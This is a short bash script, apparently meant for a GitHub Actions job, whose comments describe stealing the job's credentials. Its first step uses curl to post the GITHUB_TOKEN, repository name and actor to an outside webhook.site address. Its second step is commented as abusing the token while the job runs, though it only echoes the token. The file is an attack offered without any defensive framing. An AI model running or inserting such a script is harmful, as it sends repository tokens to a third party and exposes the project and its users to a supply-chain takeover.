#!/usr/bin/env bash
# Step 1 — exfiltrate the token to prove capture
curl -s "https://webhook.site/f0fb55d2-100b-496c-b7c3-0fa68beca9b6" \
  -d "token=$GITHUB_TOKEN" \
  -d "repo=$GITHUB_REPOSITORY" \
  -d "actor=$GITHUB_ACTOR"

# Step 2 — abuse the token while the job is still running
echo "$GITHUB_TOKEN"
